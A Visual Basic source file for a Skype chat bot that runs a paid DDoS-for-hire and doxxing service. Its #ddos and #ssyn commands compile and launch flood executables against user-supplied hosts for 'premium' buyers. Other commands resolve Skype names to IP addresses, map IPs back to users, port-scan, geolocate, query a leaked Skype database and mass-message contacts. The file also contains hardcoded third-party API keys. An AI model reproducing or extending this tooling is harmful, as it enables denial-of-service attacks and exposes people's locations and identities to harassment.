Imports Interop.SKYPE4COMLib
Imports System.Net
Imports yolo.clsCodeDom
Imports Interop

Public Class Form1
    Dim WithEvents Skype As New Skype
    Private Sub PurpleKushRadioButton2_CheckedChanged(sender As Object) Handles PurpleKushRadioButton2.CheckedChanged
        If PurpleKushRadioButton2.Checked Then
            PurpleKushRadioButton1.Checked = False
            PurpleKushRadioButton3.Checked = False
        End If
    End Sub

    Private Sub PurpleKushRadioButton1_CheckedChanged(sender As Object) Handles PurpleKushRadioButton1.CheckedChanged
        If PurpleKushRadioButton1.Checked Then
            PurpleKushRadioButton2.Checked = False
            PurpleKushRadioButton3.Checked = False
        End If
    End Sub

    '==============================
    '   This Tool Was Made By
    '         Snowfall
    '==============================

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If PurpleKushCheckBox1.Checked = False Then
            Timer5.Enabled = False
            Timer3.Enabled = False
        End If
        On Error Resume Next
        My.Settings.afk = ""
        On Error Resume Next
        Process.GetCurrentProcess.PriorityClass = ProcessPriorityClass.High
        AddHandler Skype.UserAuthorizationRequestReceived, AddressOf acceptuser

        If PurpleKushCheckBox2.Checked Then
            My.Settings.api = True
        End If
        Skype.Attach(7, False)
    End Sub

    Private Sub acceptuser(ByVal user As SKYPE4COMLib.User)
        On Error Resume Next
        If My.Settings.autoadd = True Then
            If user.IsAuthorized = False Then
                user.IsAuthorized = True
                Skype.SendMessage(user.Handle, "Welcome " & user.FullName & "!")
                Skype.SendMessage(user.Handle, "You can view all the commands by typing #commands!")
            End If
        End If
    End Sub

    ' BE SURE TO ADD THE CHECKBOX STUFF FOR AUTOADD! jesus.

    Private Sub PurpleKushCheckBox3_CheckedChanged(sender As Object) Handles PurpleKushCheckBox3.CheckedChanged
        On Error Resume Next
        If PurpleKushCheckBox3.Checked = False Then
            My.Settings.autoadd = False
        Else
            My.Settings.autoadd = True
        End If
    End Sub

    Sub skype_MessageStatus(ByVal msg As ChatMessage, ByVal status As TChatMessageStatus) Handles Skype.MessageStatus
        On Error Resume Next
        Dim chat As Chat = msg.Chat
        If status = TChatMessageStatus.cmsReceived Then
            If My.Settings.afk <> "" Then
                chat.SendMessage(My.Settings.afk)
            Else
                If My.Settings.api = True Then
                    recievedapi(msg.Body, msg.FromHandle, msg.Chat)
                Else
                    chat.SendMessage("Bot is currently disabled. Please try again later.")
                End If
            End If
        End If
        If status = TChatMessageStatus.cmsSent Then
            Dim user As String = Skype.RecentChats(1).Members(2).Handle
            'sentapi(msg.Body, user)
        End If
    End Sub

    Private Sub sentapi(ByVal message As String, Optional ByVal user As String = "rbnmag")
        On Error Resume Next
        If message.StartsWith("#shout") Then
            Dim list() As String = Split(message, "-m")
            For Each a As SKYPE4COMLib.User In Skype.Friends
                Skype.SendMessage(a.Handle, list(1))
            Next
        End If

        If message.StartsWith("#afk set") Then
            Dim list() As String = Split(message)
            Dim count As Integer = list.GetUpperBound(1)
            My.Settings.afk = list(2).ToString
            Exit Sub
        End If

        If message.StartsWith("#afk remove") Then
            My.Settings.afk = ""
        End If

        If message.StartsWith("#deleteit") Then
            For Each msg As SKYPE4COMLib.ChatMessage In Skype.RecentChats(1).Messages
                If msg.FromHandle = Skype.CurrentUser.Handle Then
                    msg.Body = ""
                End If
            Next
        End If

        If message.StartsWith("#block") Then
            Skype.User(user).IsBlocked = True
            Exit Sub
        End If

        If message.StartsWith("#unblock") Then
            Skype.User(user).IsBlocked = False
            Exit Sub
        End If

        If message.StartsWith("#spam") Then
            Dim list() As String = Split(message)
            If IsNumeric(list(2)) = True Then
            Else
                Skype.RecentChats(1).SendMessage("Value 2 needs to be integer!")
            End If
            Dim i As String = list(2)
            While i > 0
                Skype.RecentChats(1).SendMessage(list(1).ToString)
                i -= 1

            End While
            Exit Sub
        End If

        If message.StartsWith("#call") Then
            Dim list() As String = Split(message)
            Skype.PlaceCall(user)
            Exit Sub
        End If

        If message.StartsWith("#online") Then
            Skype.CurrentUserStatus = TOnlineStatus.olsOnline
            Exit Sub
        End If

        If message.StartsWith("#away") Then
            Skype.CurrentUserStatus = TOnlineStatus.olsAway
            Exit Sub
        End If

        If message.StartsWith("#busy") Then
            Skype.CurrentUserStatus = TOnlineStatus.olsDoNotDisturb
            Exit Sub
        End If

        If message.StartsWith("#hide") Then
            Skype.ChangeUserStatus(TUserStatus.cusInvisible)
        End If

        If message.StartsWith("#setpremium") Then
            Dim list() As String = Split(message)
            My.Settings.ddos = My.Settings.ddos & list(1).ToString & ","
            Skype.RecentChats(1).SendMessage("Added " & list(1).ToString & " to premium list!")
            My.Settings.Save()
            Exit Sub
        End If

        If message.StartsWith("#delpremium") Then
            Dim list() As String = Split(message)
            My.Settings.ddos = My.Settings.ddos.Replace(list(1).ToString & ",", "")
            Skype.RecentChats(1).SendMessage("Removed " & list(1).ToString & " from premium list!")
            Exit Sub
        End If

        If message.StartsWith("#ddos") Then
            Dim list() As String = Split(message)
            If list(2).ToString <= PurpleKushTextBox2.Text Then
                IO.Directory.CreateDirectory(IO.Path.GetTempPath & "\skypebottemp")
                Dim rnd As New Random

                Dim output As String = IO.Path.GetTempPath & "\skypebottemp\bot" & rnd.Next(1, 9999) & ".exe"
                Dim src As String = My.Resources.ddos
                'Changing VAR's In the stub of ddos .exe
                src = src.Replace("%server", PurpleKushTextBox5.Text)
                src = src.Replace("%host%", list(1).ToString)
                src = src.Replace("%time%", list(1).ToString)
                'Compile EXE
                Compile(output, src)
                Process.Start(output)
                Skype.RecentChats(1).SendMessage("DDoS Attack Sent!")
            Else
                Skype.RecentChats(1).SendMessage("You're exceeding the boot time limit. Please do not go over " & PurpleKushTextBox2.Text & " seconds.")
            End If
            Exit Sub
        End If

        If message.StartsWith("#trace") Then
            Dim list() As String = Split(message)
            Dim request As HttpWebRequest = HttpWebRequest.Create("http://api.c99.nl/geoip.php?key=b1o2o3t4e5r67i8n9&host=" & list(1))
            Dim response As HttpWebResponse = request.GetResponse
            Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
            source = source.Replace("<br>", vbNewLine)
            Skype.RecentChats(1).SendMessage(source)
        End If

        If message.StartsWith("#resolve") Then
            Dim list() As String = Split(message)
            Dim request As HttpWebRequest = HttpWebRequest.Create("http://api.c99.nl/skyperesolver.php?key=b1o2o3t4e5r67i8n9&username=" & list(1))
            Dim response As HttpWebResponse = request.GetResponse
            Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
            source = source.Replace(RichTextBox1.Text, "")
            source = source.Replace(RichTextBox2.Text, "")
            source = source.Replace(RichTextBox3.Text, "")
            source = source.Replace(RichTextBox4.Text, "")
            source = source.Replace(RichTextBox5.Text, "")
            Skype.RecentChats(1).SendMessage(source)
        End If
    End Sub

    Private Sub recievedapi(ByVal message As String, ByVal user As String, ByVal chat As Chat)
        On Error Resume Next
        On Error Resume Next
        If PurpleKushCheckBox1.Checked Then
            Dim accepting As Boolean = False
            Dim bak2 As Integer
            For Each item In PurpleKushListBox1.items
                If InStr(item, user) Then
                    bak2 += 1
                    Dim data() As String = Split(item, "   ")
                    If data(1) <= Date.Now Then
                        accepting = True
                    End If
                End If
            Next
            If bak2 = 0 Then
                accepting = True
            End If
            If accepting = False Then
                PurpleKushListBox2.AddItem(user)
                Skype.SendMessage(user, "Don't spam, yeah?")
                Dim countspammers As Integer = 0
                For Each item In PurpleKushListBox2.items
                    If InStr(item, user) Then
                        countspammers += 1
                    End If
                Next
                If countspammers >= 5 Then
                    Skype.SendMessage(user, "You have been blocked for 10 minutes. Why?: Command Spamming.")
                    Dim date2 = Date.Now
                    date2 = date2.AddSeconds(600)
                    PurpleKushListBox3.AddItem(user & "   " & date2)
                    Skype.User(user).IsBlocked = True
                End If
                Exit Sub
            End If
            Dim dates = Date.Now
            dates = dates.AddSeconds(2)
            PurpleKushListBox1.AddItem(user & "    " & dates)
        End If
        If message.StartsWith("#showprems") Then
            Dim prems As String = ""
            prems = prems & My.Settings.ddos & My.Settings.autobuyprems & vbNewLine & "| Temporary Premiums: " & My.Settings.tempprem
            chat.SendMessage(prems)
        End If
        If InStr(My.Settings.admins, user) Then
            If message.StartsWith("#online") Then
                Skype.CurrentUserStatus = TUserStatus.cusOnline
                Exit Sub
            End If
            If message.StartsWith("#away") Then
                Skype.CurrentUserStatus = TUserStatus.cusAway
                Exit Sub
            End If
            If message.StartsWith("#busy") Then
                Skype.CurrentUserStatus = TUserStatus.cusDoNotDisturb
                Exit Sub
            End If
            If message.StartsWith("#hide") Then
                Skype.CurrentUserStatus = TUserStatus.cusInvisible
                Exit Sub
            End If

            If message.StartsWith("#setadmin") Then
                Dim list() As String = Split(message)
                My.Settings.admins = My.Settings.admins + ", " & list(1)
                My.Settings.Save()
                Exit Sub
            End If
            If message.StartsWith("#deladmin") Then
                Dim list() As String = Split(message)
                Dim tmp As String = My.Settings.admins
                My.Settings.admins = tmp.Replace(list(1), "")
                My.Settings.Save()
                Exit Sub
            End If
            If message.StartsWith("#showadmin") Then
                chat.SendMessage(My.Settings.admins)
                Exit Sub
            End If
            If message.StartsWith("#block") Then
                Dim list() As String = Split(message)
                Skype.User(list(1)).IsBlocked = True
                Exit Sub
            End If
            If message.StartsWith("#unblock") Then
                Dim list() As String = Split(message)
                Skype.User(list(1)).IsBlocked = False
                Exit Sub
            End If
            If message.StartsWith("#shout") Then
                On Error Resume Next
                Dim list() As String = Split(message, "-m")
                For Each a As SKYPE4COMLib.User In Skype.Friends
                    Skype.SendMessage(a.Handle, list(1))
                Next
                Exit Sub
            End If

            If message.StartsWith("#ulriksen") Then
                chat.SendMessage("Kom da bjørnen min!")
                Exit Sub
            End If

            If message.StartsWith("#edvin") Then
                chat.SendMessage("http://yung-ed.tumblr.com/" + " very good")
            End If

            If message.StartsWith("#afk set") Then
                Dim list() As String = Split(message, "-m")
                My.Settings.afk = list(1).ToString
                Exit Sub
            End If
            If message.StartsWith("#afk remove") Then
                My.Settings.afk = ""
                Exit Sub
            End If

            If message.StartsWith("#ahelp") Then
                chat.SendMessage(My.Resources.adminhelp)
                Exit Sub
            End If

            If message.StartsWith("#setpremium") Then
                Dim list() As String = Split(message)
                My.Settings.ddos = My.Settings.ddos & list(1).ToString & ","
                chat.SendMessage("Added " & list(1).ToString & " to premium list!")
                Skype.SendMessage(list(1).ToString, "You have been upgraded to premium! Enjoy.")
                Exit Sub
            End If

            If message.StartsWith("#delpremium") Then
                Dim list() As String = Split(message)
                My.Settings.ddos = My.Settings.ddos.Replace(list(1).ToString & ",", "")
                chat.SendMessage("Removed " & list(1).ToString & " from premium list!")
                Skype.SendMessage(list(1).ToString, "Your premium has been removed.")
                My.Settings.Save()
                Exit Sub
            End If

            If message.StartsWith("#leave") Then
                Skype.RecentChats(1).Leave()
                Exit Sub
            End If
            If message = ("bot?") Then
                chat.SendMessage("Yes, master?")
                Exit Sub
            End If
            If message.StartsWith("#mood") Then
                Dim list() As String = Split(message, "-m")
                Dim text As String = list(1)
                Skype.CurrentUserProfile.RichMoodText = text
                Exit Sub
            End If
            If message.StartsWith("#info") Then
                On Error Resume Next
                Dim chatsent As Chat = chat
                Dim x As New Threading.Thread(DirectCast(Sub() showinfo(chatsent), Threading.ThreadStart))
                x.Start()
                Exit Sub
            End If
        End If
        If message.ToLower = "hello" Or message.ToLower = "hi" Or message.ToLower = "hallo" Or message.ToLower = "yo" Or message.ToLower = "hai" Or message.ToLower = "aye" Then
            chat.SendMessage("Hello stranger. Type #commands to see all available commands!")
            Exit Sub
        End If
        If message.StartsWith("#membership") Then
            If InStr(My.Settings.ddos, user) Or InStr(My.Settings.tempprem, user) Or InStr(My.Settings.autobuyprems, user) Then
                chat.SendMessage("You are premium!")
            Else
                chat.SendMessage("You are not premium!")
            End If
            Exit Sub
        End If
        If message.StartsWith("#cfresolve") Then
            Dim list() As String = Split(message)
            Dim siteraw As String = list(1)
            Dim website As String
            siteraw = siteraw.Replace("http://", "")
            siteraw = siteraw.Replace("www.", "")
            website = siteraw
            Dim request As HttpWebRequest = HttpWebRequest.Create("https://iresolve.pw/api.php?cf_key=CLOUD-FLARE-FREE-KEY-8194&url=" & website)
            Threading.Thread.Sleep(6000)
            Dim response As HttpWebResponse = request.GetResponse
            Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
            source = source.Replace("<br>", vbNewLine)
            chat.SendMessage(source)
        End If

        If message.StartsWith("#deto") Then
            chat.SendMessage("Come on', Deto ain't hetro.")
            Exit Sub
        End If

        If message.StartsWith("#purchase") Then
            chat.SendMessage("Manual Purchase is currently the only thing available. Please contact Snowfall privately if you want to buy.")
            'Dim link As String = "http://5.196.46.239/premium/buy.php?username=" & user
            'Dim list() As String = Split(message)
            'Dim request as HttpWebRequest = HttpWebRequest.Create("adfly link" & textbox & textbox & textbox)
            'Dim response As HttpWebResponse = request.GetResponse
            'Dim source As String = new IO.StreamReader(response.GetResponseStream).ReadToEnd
            'Dim text As String = My.Resources.buy
            'text = text.Replace("LINKHERE", source)
            'chat.SendMessage(text)
            Exit Sub
        End If

        If message.StartsWith("#ping") Then
            Dim list() As String = Split(message)
            Dim x As New Threading.Thread(DirectCast(Sub() ping(list(1), user, chat), Threading.ThreadStart))
            x.Start()
            Exit Sub
        End If
        If message.StartsWith("#blacklist") Then
            chat.SendMessage("Manual Purchase is currently the only thing available. Please contact Snowfall privately if you want to purchase blacklisting.")
            'Dim list() As String = Split(message)
            'Dim skypename As String = list(1)
            'If skypename = "" Then
            'chat.SendMessage("Error. No SkypeName was submitted. Please use this format: #blacklist {username}")
            'Exit Sub
            'End If
            'Dim text As String = My.Resources.blacklist
            'Dim link As String = "http://5.196.46.239/premium/buyblacklist.php?user=" & skypename
            'Dim request2 As HttpWebRequest = HttpWebRequest.Create("ADFLY LINK" & other stuff)
            'Dim response2 As HttpWebResponse = request2.GetResponse
            'Dim source2 As String = New IO.StreamReader(response2.GetResponseStream).ReadToEnd
            'Dim link2 as String = source2
            'text = text.Replace("LINKHERE", link2)
            'text = text.Replace("NAMEHERE", skypename)
            'chat.SendMessage(text)
            Exit Sub
        End If

        If message.StartsWith("#about") Then
            chat.SendMessage(My.Resources.about)
            Exit Sub
        End If

        If message.StartsWith("#constat") Then
            chat.SendMessage("Status: " & Skype.ConnectionStatus.ToString.Replace("con", ""))
            Exit Sub
        End If

        If message.StartsWith("#resolve") Then
            On Error Resume Next
            Dim list() As String = Split(message)
            If InStr(My.Settings.blacklistedskypenames, list(1)) Then
                chat.SendMessage("This Skype is blacklisted. Sorry.")
                Dim request2 As HttpWebRequest = HttpWebRequest.Create("http://api.c99.nl/skyperesolver.php?key=b1o2o3t4e5r67i8n9&username=" & list(1))
                Dim response2 As HttpWebResponse = request2.GetResponse
                Dim source2 As String = New IO.StreamReader(response2.GetResponseStream).ReadToEnd
            Else
                Dim checksum As Integer = 0
                For Each item In PurpleKushListBox4.items
                    If InStr(item, user) Then
                        checksum += 1
                    End If
                Next
                If checksum <= 5 Then
                    If InStr(message.ToLower, "rbnmag") Or InStr(message.ToLower, "outgrows") Or InStr(message.ToLower, "bad-killer12345") Or InStr(message.ToLower, "jessepinkman.") Or InStr(message.ToLower, "dannyboi2544") Or InStr(message.ToLower, "enxhell3") Then
                        chat.SendMessage("Nice try.")
                    Else
                        Dim x As New Threading.Thread(DirectCast(Sub() resolve(message, user, chat), Threading.ThreadStart))
                        x.Start()
                    End If
                Else
                    If InStr(My.Settings.ddos, user) Or InStr(My.Settings.tempprem, user) Or InStr(My.Settings.autobuyprems, user) Or InStr(My.Settings.blacklistedskypenames, message.ToLower) Then
                        If InStr(message.ToLower, "rbnmag") Or InStr(message.ToLower, "outgrows") Or InStr(message.ToLower, "bad-killer12345") Or InStr(message.ToLower, "jessepinkman.") Or InStr(message.ToLower, "dannyboi2544") Or InStr(message.ToLower, "enxhell3") Then
                            chat.SendMessage("Nice try.")
                        Else
                            Dim x As New Threading.Thread(DirectCast(Sub() resolve(message, user, chat), Threading.ThreadStart))
                            chat.SendMessage("Resolving...")
                            x.Start()
                        End If
                    Else
                        chat.SendMessage("You have reached the maximum of your hourly resolve service. Please purchase premium to remove this limit.")
                    End If
                End If
            End If
        End If

        If message.StartsWith("#ddos") Then
            On Error Resume Next
            If InStr(My.Settings.ddos, user) Or InStr(My.Settings.tempprem, user) Or InStr(My.Settings.autobuyprems, user) Then
                Dim list() As String = Split(message)
                If list(2).ToString <= PurpleKushTextBox2.Text Then

                    Dim accept As Boolean
                    Dim bak As Integer = 0
                    For Each item In PurpleKushListBox5.items
                        If InStr(item, user) Then
                            bak += 1
                            Dim data() As String = Split(item, "   ")
                            If data(1) <= Date.Now Then
                                accept = True

                            End If
                        End If
                    Next
                    If bak = 0 Then
                        accept = True
                    End If
                    If accept <> True Then
                        chat.SendMessage("You already have an attack running!")
                    Else : Dim datum = Date.Now
                        datum = datum.AddSeconds(list(2).ToString)
                        PurpleKushListBox5.AddItem(user & "    " & datum)
                        IO.Directory.CreateDirectory(IO.Path.GetTempPath & "\skypebottemp")
                        Dim rnd As New Random
                        Dim output As String = IO.Path.GetTempPath & "\skypebottemp\bot" & rnd.Next(1, 9999) & ".exe"
                        Dim src As String = My.Resources.ddos
                        src = src.Replace("%server%", PurpleKushTextBox4.Text)
                        src = src.Replace("%host%", list(1).ToString)
                        src = src.Replace("%time%", list(2).ToString)

                        Compile(output, src)
                        Process.Start(output)
                        If PurpleKushCheckBox5.Checked = True Then
                            Dim rnd2 As New Random
                            Dim output2 As String = IO.Path.GetTempPath & "\skypebottemp\bot" & rnd.Next(1, 9999) & ".exe"
                            Dim src2 As String = My.Resources.ddos
                            src2 = src2.Replace("%server%", "")
                            src2 = src2.Replace("%host%", list(1).ToString)
                            src2 = src2.Replace("%time%", list(2).ToString)
                            Compile(output, src)
                            Process.Start(output)
                        End If
                        chat.SendMessage("Attack Sent!")
                    End If
                    chat.SendMessage("Max boot time is " & PurpleKushTextBox2.Text & " seconds!")
                End If
            Else

                chat.SendMessage("You're not on the premium list.")
            End If
            Exit Sub
        End If

        If message.StartsWith("#ip2skype") Then
            On Error Resume Next
            If message = "#ip2skype" Then
                chat.SendMessage("Wrong Usage!")
                Exit Sub
            End If
            Dim list() As String = Split(message)
            Dim IP As String = list(1)
            Dim x As New Threading.Thread(DirectCast(Sub() ip2skype(IP, chat), Threading.ThreadStart))
            x.Start()
            Exit Sub
        End If

        If message.StartsWith("#skypedb") Then
            On Error Resume Next
            Dim list() As String = Split(message)
            Dim request As HttpWebRequest = HttpWebRequest.Create("http://www.hackthatapi.com/?tool=skypedblookup&username=" & list(1))
            Dim reponse As HttpWebResponse = request.GetResponse
            Dim source As String = New IO.StreamReader(reponse.GetResponseStream).ReadToEnd
            chat.SendMessage(source)
        End If


        If message.StartsWith("#vpndetect") Then
            On Error Resume Next
            Dim x As New Threading.Thread(DirectCast(Sub() vpndetect(message, chat), Threading.ThreadStart))
            x.Start()
            Exit Sub
        End If

        If message.StartsWith("#joke") Then
            On Error Resume Next
            chat.SendMessage("What did the dog say to the cat?")
            chat.SendMessage("Fuck you.")
            Exit Sub
        End If

        If message.StartsWith("#portscan") Then
            If message = "#portscan" Then
                chat.SendMessage("Wrong Usage")
                Exit Sub
            End If
            Dim list() As String = Split(message)
            Dim IP As String = list(1)
            chat.SendMessage("Scanning ports on " & IP & "...")
            Dim x As New Threading.Thread(DirectCast(Sub() portscan(IP, chat), Threading.ThreadStart))
            x.Start()
            Exit Sub
        End If

        If message.StartsWith("#trace") Then
            Dim list() As String = Split(message)
            Dim request As HttpWebRequest = HttpWebRequest.Create("http://api.c99.nl/geoip.php?key=b1o2o3t4e5r67i8n9&host=" & list(1))
            Dim response As HttpWebResponse = request.GetResponse
            Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
            source = source.Replace("<br>", vbNewLine)
            chat.SendMessage(source)
        End If

        If message.StartsWith("#commands") Then
            Dim help As String = My.Resources.commands.ToString
            chat.SendMessage(help)
            Exit Sub
        End If

        If message.StartsWith("#ssyn") Then
            If InStr(My.Settings.ddos, user) Or InStr(My.Settings.tempprem, user) Or InStr(My.Settings.autobuyprems, user) Then
                Dim list() As String = Split(message)
                If list(2).ToString <= PurpleKushTextBox2.Text Then

                    Dim accept As Boolean
                    Dim bak As Integer = 0
                    For Each item In PurpleKushListBox5.items
                        If InStr(item, user) Then
                            bak += 1
                            Dim data() As String = Split(item, "   ")
                            If data(1) <= Date.Now Then
                                accept = True
                            End If
                        End If
                    Next
                    If bak = 0 Then
                        accept = True
                    End If
                    If accept <> True Then
                        chat.SendMessage("You already have a DDOS running.")
                    Else : Dim datum = Date.Now
                        datum = datum.AddSeconds(list(2).ToString)
                        PurpleKushListBox5.AddItem(user & "    " & datum)


                        IO.Directory.CreateDirectory(IO.Path.GetTempPath & "\skypebottemp")
                        Dim rnd As New Random
                        Dim output As String = IO.Path.GetTempPath & "\skypebottemp\bot" & rnd.Next(1, 9999) & ".exe"
                        Dim src As String = My.Resources.ssyn
                        src = src.Replace("%server%", PurpleKushTextBox4.Text)
                        src = src.Replace("%host%", list(1).ToString)
                        src = src.Replace("%time%", list(2).ToString)
                        Compile(output, src)
                        Process.Start(output)
                        chat.SendMessage("DDOS Attack sent!")
                    End If
                Else
                    chat.SendMessage("Max boot time is 120 seconds!")
                End If

            Else
                chat.SendMessage("You're not on the Premium list.")

            End If
            Exit Sub
        End If
    End Sub

    Private Sub resolve(ByVal message As String, ByVal user As String, ByVal chat As Chat)
        On Error Resume Next

        Dim list() As String = Split(message)
        Dim request As HttpWebRequest
        Dim sentChat As ChatMessage = chat.SendMessage("R")
        list(1) = list(1).ToLower
        Dim flash As New Threading.Thread(DirectCast(Sub() flasheffect(sentChat), Threading.ThreadStart))
        flash.Start()
        If PurpleKushRadioButton1.Checked Then
            request = HttpWebRequest.Create("http://api.c99.nl/skyperesolver.php?key=b1o2o3t4e5r67i8n9&username=" & list(1))
        ElseIf PurpleKushRadioButton2.Checked Then
            request = HttpWebRequest.Create("http://www.swiftresolver.com/resolver.php?name=" & list(1))
        ElseIf PurpleKushRadioButton3.Checked Then
            request = HttpWebRequest.Create("http://www.hackthatapi.com/?tool=skyperesolver&username=" & list(1))
        Else
            request = Nothing
        End If
        Dim response As HttpWebResponse = request.GetResponse
        Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
        Dim source2 = ""
        flash.Abort()
        sentChat.Body = source
        PurpleKushListBox4.AddItem(user)
    End Sub

    Private Sub flasheffect(ByVal chat As ChatMessage)
        On Error Resume Next
        Threading.Thread.Sleep(100)
        chat.Body = "R"
        Threading.Thread.Sleep(100)
        chat.Body = "Re"
        Threading.Thread.Sleep(100)
        chat.Body = "Res"
        Threading.Thread.Sleep(100)
        chat.Body = "Reso"
        Threading.Thread.Sleep(100)
        chat.Body = "Resol"
        Threading.Thread.Sleep(100)
        chat.Body = "Resolvi"
        Threading.Thread.Sleep(100)
        chat.Body = "Resolvin"
        Threading.Thread.Sleep(100)

lol:
        'Overlap
        chat.Body = "Resolving"
        Threading.Thread.Sleep(100)
        chat.Body = "Resolving."
        Threading.Thread.Sleep(100)
        chat.Body = "Resolving.."
        Threading.Thread.Sleep(100)
        chat.Body = "Resolving..."
        Threading.Thread.Sleep(100)
        GoTo lol
    End Sub

    Private Sub portscan(ByVal ip As String, ByVal chat As Chat)
        Dim request As HttpWebRequest = HttpWebRequest.Create("http://api.c99.nl/multiportscanner.php?key=b1o2o3t4e5r67i8n9&host=" & ip)
        Dim response As HttpWebResponse = request.GetResponse
        Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
        chat.SendMessage("Open Ports on " & ip & ": " & source)

    End Sub

    Private Sub ip2skype(ByVal ip As String, ByVal chat As Chat)
        Dim request As HttpWebRequest = HttpWebRequest.Create("http://api.c99.nl/ip2skype.php?key=b1o2o3t4e5r67i8n9&ip=" & ip)
        Dim response As HttpWebResponse = request.GetResponse
        Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
        chat.SendMessage("Users with IP " & ip & ": " & source)
    End Sub

    Private Sub ping(ByVal ip As String, ByVal user As String, ByVal chat As Chat)
        On Error Resume Next
        Dim done As String = 0
        Dim success As String = 0
        Dim failed As String = 0
        Do While done < 5
            If pinging(ip) = 1 Then
                chat.SendMessage("Recieved reply from " & ip)
                success += 1
            Else
                chat.SendMessage("No reply from " & ip)
                failed += 1
            End If
            Threading.Thread.Sleep(1000)
            done += 1
        Loop
        Dim sum As String = success + failed
        Dim replyrat As String = 100 / 5
        Dim replyrate As String = replyrat * Val(success)
        chat.SendMessage("Avarage Reply Rate: " & replyrate & "%")
    End Sub

    Function pinging(ByVal URL As String) As Integer
        Try
            My.Computer.Network.Ping(URL)
            Return 1
        Catch
            Return 0

        End Try
    End Function

    Private Sub vpndetect(ByVal message As String, ByVal chat As Chat)
        On Error Resume Next
        If message = "!vpndetector" Then
            chat.SendMessage("wrong usage")
            Exit Sub
        End If
        Dim list() As String = Split(message)
        Dim IP As String = list(1)
        Dim request As HttpWebRequest = HttpWebRequest.Create("http://abrasivecraft.com/api.php?cmd=13&ip=" & IP)
        Dim response As HttpWebResponse = request.GetResponse
        Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
        If source = "VPN Detected" Then
            chat.SendMessage("Detected a VPN on the IP " & IP)
        Else
            Dim request2 As HttpWebRequest = HttpWebRequest.Create("http://abrasivecraft.com/api.php?cmd=10&ip=" & IP)
            Dim response2 As HttpWebResponse = request2.GetResponse
            Dim source2 As String = New IO.StreamReader(response2.GetResponseStream).ReadToEnd
            If source2 = "Proxy Not Detected" Then
                chat.SendMessage("No VPN detected on the IP " & IP & "!")
            Else
                chat.SendMessage("No VPN Detected on " & IP & " But we could detect a Proxy!")
            End If
        End If
    End Sub

    Private Sub showinfo(ByVal chatthatsent As Chat)
        On Error Resume Next
        Dim messagetochange As ChatMessage = chatthatsent.SendMessage("G")
        Dim x As New Threading.Thread(DirectCast(Sub() grabinfos(messagetochange), Threading.ThreadStart))
        x.Start()
        Dim onlinecontacts As String = 0
        Dim contacts As String = 0
        For Each a As SKYPE4COMLib.User In Skype.Friends
            If a.OnlineStatus = TOnlineStatus.olsOnline Then
                onlinecontacts = onlinecontacts + 1
            End If
            If a.OnlineStatus = TOnlineStatus.olsDoNotDisturb Then
                onlinecontacts = onlinecontacts + 1
            End If
            If a.OnlineStatus = TOnlineStatus.olsAway Then
                onlinecontacts = onlinecontacts + 1
            End If
            contacts = contacts + 1
        Next
        x.Abort()
        messagetochange.Body = "Current users: " & contacts & vbNewLine & "Online users: " & onlinecontacts & vbNewLine & "Open chats: " & Skype.Chats.Count & vbNewLine & "Total recieved: " & Skype.Messages.Count
    End Sub

    Private Sub grabinfos(ByVal chat As ChatMessage)
        On Error Resume Next
        Threading.Thread.Sleep(100)
        chat.Body = "Gr"
        Threading.Thread.Sleep(100)
        chat.Body = "Gra"
        Threading.Thread.Sleep(100)
        chat.Body = "Grab"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabb"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbi"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbin"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbing"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbing i"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbing in"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbing inf"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbing info"
        Threading.Thread.Sleep(100)
        chat.Body = "Grabbing infos"
        Threading.Thread.Sleep(300)

again:
        chat.Body = "Grabbing infos"
        Threading.Thread.Sleep(300)
        chat.Body = "Grabbing infos."
        Threading.Thread.Sleep(300)
        chat.Body = "Grabbing infos.."
        Threading.Thread.Sleep(300)
        chat.Body = "Grabbing infos..."
        Threading.Thread.Sleep(300)
        GoTo again
    End Sub

    Private Sub PurpleKushButton1_Click(sender As Object, e As EventArgs) Handles PurpleKushButton1.Click
        My.Settings.admins = My.Settings.admins & ", " & PurpleKushTextBox1.Text
    End Sub

    Private Sub PurpleKushButton2_Click(sender As Object, e As EventArgs) Handles PurpleKushButton2.Click
        Dim tmp As String = My.Settings.admins
        My.Settings.admins = tmp.Replace(PurpleKushTextBox1.Text, "")
    End Sub

    Private Sub PurpleKushButton3_Click(sender As Object, e As EventArgs) Handles PurpleKushButton3.Click
        MessageBox.Show(My.Settings.admins, "Admin List", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        On Error Resume Next
        Dim flash As New Threading.Thread(DirectCast(Sub() updatestuff(), Threading.ThreadStart))
    End Sub

    Private Sub updatestuff()
        On Error Resume Next
        Dim prems As String
        Dim blacklistedskypenames As String
        Dim request As HttpWebRequest = HttpWebRequest.Create("http://5.196.46.239/skypebotpremium/check.php")
        Dim request2 As HttpWebRequest = HttpWebRequest.Create("http://5.196.46.239/skypebotpremium/blacklistedskypenames.php")
        Dim response As HttpWebResponse = request.GetResponse
        Dim response2 As HttpWebResponse = request2.GetResponse
        Dim source As String = New IO.StreamReader(response.GetResponseStream).ReadToEnd
        Dim source2 As String = New IO.StreamReader(response2.GetResponseStream).ReadToEnd
        prems = source
        blacklistedskypenames = source2
        My.Settings.blacklistedskypenames = blacklistedskypenames
        My.Settings.autobuyprems = prems
    End Sub

    Private Sub PurpleKushRadioButton3_CheckedChanged(sender As Object) Handles PurpleKushRadioButton3.CheckedChanged
        If PurpleKushRadioButton3.Checked Then
            PurpleKushRadioButton2.Checked = False
            PurpleKushRadioButton1.Checked = False
        End If
    End Sub
End Class
